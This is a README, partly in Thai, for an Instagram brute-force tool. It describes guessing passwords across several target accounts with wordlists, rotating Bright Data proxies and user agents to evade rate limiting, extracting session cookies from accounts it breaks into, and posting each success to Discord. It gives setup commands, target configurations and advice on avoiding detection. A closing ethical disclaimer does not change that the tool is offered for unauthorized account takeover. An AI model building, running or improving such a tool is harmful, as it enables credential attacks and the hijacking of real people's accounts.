# 🔓 Advanced Instagram Brute Force with Proxy Support

ระบบ Brute Force สำหรับ Instagram ที่พัฒนาขึ้นมาพร้อม Bright Data Proxy integration, การหมุนเวียน IP อัตโนมัติ, และการจัดการ rate limiting ที่ทันสมัย

## ✨ Features

### 🌐 Advanced Proxy Support
- **Bright Data Integration**: รองรับ Bright Data proxy พร้อม geo-targeting
- **Automatic Rotation**: หมุนเวียน IP และ session อัตโนมัติ
- **Smart Fallback**: ย้ายไปใช้ direct connection เมื่อ proxy ล้มเหลว
- **Rate Limit Detection**: ตรวจจับ rate limiting และหมุนเวียน proxy อัตโนมัติ

### 🔑 Brute Force Features
- **Multi-target Support**: โจมตีหลาย accounts พร้อมกัน
- **Custom Wordlists**: รองรับ wordlist หลายไฟล์
- **Session Extraction**: ดึง session cookies เมื่อ login สำเร็จ
- **Smart Retry**: ลองใหม่อัตโนมัติเมื่อเกิดข้อผิดพลาด

### 📊 Monitoring & Logging
- **Discord Notifications**: แจ้งเตือนผ่าน Discord เมื่อสำเร็จ
- **Detailed Logging**: บันทึกผลลัพธ์ครบถ้วน
- **Real-time Status**: แสดงสถานะการทำงานแบบ real-time
- **Statistics**: สถิติการใช้ proxy และ success rate

## 🚀 Quick Start

### Option 1: Quick Setup (แนะนำ)
```bash
# ทำให้ setup script executable และรัน
chmod +x quick_setup.sh
./quick_setup.sh

# ทดสอบระบบ
./test_setup.sh

# รัน brute force
./run_brute.sh
```

### Option 2: Manual Setup
```bash
# ติดตั้ง dependencies
pip install requests urllib3 certifi chardet idna

# รัน setup script
python3 setup_advanced_brute.py

# ทดสอบ proxy
python3 test_proxy_brute.py

# รัน brute force
python3 run_advanced_brute.py
```

## ⚙️ Configuration

### 1. Proxy Configuration (`proxy_config.json`)
```json
{
    "proxy_host": "brd.superproxy.io",
    "proxy_port": "33335", 
    "proxy_user": "your-brightdata-username",
    "proxy_pass": "your-brightdata-password",
    "enabled": true,
    "rotation_enabled": true,
    "country_targeting": ["US", "CA", "GB", "AU"]
}
```

### 2. Brute Force Configuration (`brute_config.json`)
```json
{
    "request_delay": 3,
    "max_attempts": 20,
    "use_proxy": true,
    "proxy_rotation_interval": 5,
    "targets": [
        {
            "identifier": "target_username",
            "type": "username"
        }
    ],
    "wordlists": ["common_passwords.txt", "custom_passwords.txt"]
}
```

### 3. Target Management
```bash
# เพิ่ม target ใน brute_config.json
{
    "targets": [
        {
            "identifier": "username_target",
            "type": "username",
            "notes": "Test account"
        },
        {
            "identifier": "email@example.com",
            "type": "email"
        }
    ]
}
```

## 📝 Wordlist Management

### สร้าง Custom Wordlist
```bash
# สร้างไฟล์ custom_passwords.txt
echo "password123" >> custom_passwords.txt
echo "instagram2024" >> custom_passwords.txt
echo "target_specific_pass" >> custom_passwords.txt

# เพิ่มใน brute_config.json
"wordlists": ["common_passwords.txt", "custom_passwords.txt"]
```

### ใช้ Target-specific Wordlist
```json
{
    "targets": [
        {
            "identifier": "specific_target",
            "type": "username",
            "preferred_wordlist": "target_specific.txt"
        }
    ]
}
```

## 🌐 Proxy Features

### Bright Data Integration
- **Geo-targeting**: เลือกประเทศที่ต้องการ
- **Session Rotation**: หมุนเวียน session อัตโนมัติ
- **Sticky Sessions**: รักษา session เดิมตามต้องการ
- **User-Agent Rotation**: หมุนเวียน User-Agent

### Proxy Testing
```bash
# ทดสอบ proxy connection
python3 test_proxy_brute.py

# ทดสอบ Bright Data features
python3 -c "from modules.proxy_manager import ProxyManager; pm = ProxyManager(); pm.test_bright_data_features()"
```

## 📊 Output Files

### `brute_results.json`
```json
{
    "started_at": "2025-05-24T10:00:00",
    "summary": {
        "total_targets": 2,
        "successful_logins": 1,
        "total_attempts": 25
    },
    "results": [...]
}
```

### `extracted_sessions.json`
```json
{
    "extracted_at": "2025-05-24T10:30:00",
    "total_sessions": 1,
    "sessions": [
        {
            "target": "test_account",
            "session_id": "sessionid_value...",
            "user_id": "12345678",
            "cookies": {...}
        }
    ]
}
```

## 🔧 Advanced Usage

### Custom Scripts
```python
from brute_force import InstagramBruteForce

# สร้าง instance
bf = InstagramBruteForce("custom_config.json")

# เพิ่ม targets
bf.add_target("username", "username")
bf.add_target("email@test.com", "email")

# รัน brute force
results = bf.run_brute_force()
```

### Proxy Management
```python
from modules.proxy_manager import ProxyManager

# สร้าง proxy manager
pm = ProxyManager()

# ทดสอบ connection
pm.test_connection()

# สร้าง session พร้อม geo-targeting
session = pm.get_bright_data_session(country="US")
```

## ⚠️ Ethical Usage Guidelines

### ✅ Allowed Usage
- Testing your own accounts
- Authorized penetration testing
- Security research with permission
- Educational purposes (responsible)

### ❌ Prohibited Usage
- Attacking accounts without permission
- Unauthorized access attempts
- Any illegal activities
- Harassment or stalking

### 🛡️ Responsible Disclosure
If you discover vulnerabilities:
1. Do not exploit them maliciously
2. Report to Instagram through proper channels
3. Follow responsible disclosure practices
4. Respect user privacy and data

## 🚨 Legal Disclaimer

**THIS TOOL IS FOR EDUCATIONAL AND AUTHORIZED TESTING PURPOSES ONLY**

- You are solely responsible for your actions
- Ensure compliance with all applicable laws
- Obtain proper authorization before testing
- Use at your own risk

## 🐛 Troubleshooting

### Common Issues

#### Proxy Connection Failed
```bash
# Check proxy credentials
cat proxy_config.json

# Test connection
python3 -c "from modules.proxy_manager import ProxyManager; ProxyManager().test_connection()"

# Try different endpoint
# Update proxy_host/proxy_port in proxy_config.json
```

#### Rate Limiting
```bash
# Increase delays in brute_config.json
"request_delay": 5,
"proxy_rotation_interval": 3

# Enable smart rotation
"rotation_enabled": true,
"auto_fallback": true
```

#### Module Import Errors
```bash
# Reinstall requirements
pip3 install -r requirements.txt

# Check Python path
python3 -c "import sys; print(sys.path)"

# Recreate modules
python3 setup_advanced_brute.py
```

### Debug Mode
```bash
# Enable debug logging
export DEBUG=1
python3 run_advanced_brute.py

# Check logs
tail -f logs/brute_force.log
```

## 📚 File Structure

```
├── brute_force.py              # Main brute force engine
├── run_advanced_brute.py       # Advanced runner script
├── test_proxy_brute.py         # Proxy testing script
├── setup_advanced_brute.py     # Setup and configuration
├── quick_setup.sh             # Quick setup script
├── brute_config.json          # Main configuration
├── proxy_config.json          # Proxy configuration
├── common_passwords.txt       # Default wordlist
├── modules/
│   ├── proxy_manager.py       # Proxy management
│   └── browser_api_manager.py # Browser API
├── webhook/
│   └── discord_notify.py      # Discord notifications
├── output/                    # Results and logs
├── logs/                      # Debug logs
└── templates/                 # Configuration templates
```

## 🔄 Updates & Maintenance

### Check for Updates
```bash
# Update proxy endpoints
# Update user agents
# Check Instagram API changes
```

### Performance Optimization
```bash
# Monitor success rates
grep "SUCCESS" logs/brute_force.log | wc -l

# Optimize delays
# Tune proxy rotation intervals
# Update wordlists based on results
```

## 🤝 Contributing

1. Fork the repository
2. Create feature branch
3. Test thoroughly
4. Submit pull request
5. Follow ethical guidelines

## 📞 Support

For issues and questions:
1. Check troubleshooting section
2. Review configuration files
3. Test proxy connectivity
4. Check logs for errors

---

**Remember: Use this tool ethically and responsibly. Always obtain proper authorization before testing.**
